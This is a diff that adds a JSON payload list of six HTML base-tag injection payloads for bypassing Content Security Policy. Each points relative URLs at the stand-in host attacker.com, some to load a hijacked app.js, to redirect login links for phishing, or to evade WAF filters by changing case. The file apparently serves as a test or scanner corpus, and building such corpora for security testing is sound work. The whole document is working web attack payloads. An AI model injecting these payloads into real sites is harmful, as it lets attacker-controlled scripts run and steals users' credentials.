@@ -1,0 +1,62 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "base_injection",
+  "description": "Payloads exploiting missing base-uri directive — <base> tag redirects relative script URLs to attacker-controlled origin",
+  "count": 6,
+  "payloads": [
+    {
+      "id": "csp-base-001",
+      "category": "csp_bypass",
+      "subcategory": "base_injection",
+      "payload": "<base href='https://attacker.com/'>",
+      "description": "Base tag injection — redirects all relative URLs to attacker origin",
+      "technique": "base_injection",
+      "csp_bypass": "Missing base-uri allows <base> tag to hijack relative script paths"
+    },
+    {
+      "id": "csp-base-002",
+      "category": "csp_bypass",
+      "subcategory": "base_injection",
+      "payload": "<base href='//attacker.com'>",
+      "description": "Protocol-relative base — inherits current scheme",
+      "technique": "base_injection",
+      "csp_bypass": "Missing base-uri with protocol-relative URL"
+    },
+    {
+      "id": "csp-base-003",
+      "category": "csp_bypass",
+      "subcategory": "base_injection",
+      "payload": "<base href='https://attacker.com/'><script src='/app.js'></script>",
+      "description": "Base + relative script — loads app.js from attacker.com",
+      "technique": "base_injection",
+      "csp_bypass": "Base tag makes relative script-src load from attacker domain"
+    },
+    {
+      "id": "csp-base-004",
+      "category": "csp_bypass",
+      "subcategory": "base_injection",
+      "payload": "<base href='https://attacker.com/'><a href='/login'>Login</a>",
+      "description": "Base + link phishing — redirects all relative links",
+      "technique": "base_injection",
+      "csp_bypass": "Base tag redirects form actions and links for credential theft"
+    },
+    {
+      "id": "csp-base-005",
+      "category": "csp_bypass",
+      "subcategory": "base_injection",
+      "payload": "<base target='_blank' href='https://attacker.com/'>",
+      "description": "Base with target — opens hijacked links in new tab",
+      "technique": "base_injection",
+      "csp_bypass": "Base tag with target attribute for tab-based phishing"
+    },
+    {
+      "id": "csp-base-006",
+      "category": "csp_bypass",
+      "subcategory": "base_injection",
+      "payload": "<BASE HREF=\"https://attacker.com/\">",
+      "description": "Uppercase base tag — WAF filter evasion variant",
+      "technique": "base_injection",
+      "csp_bypass": "Case-insensitive HTML parsing bypasses tag filters"
+    }
+  ]
+}
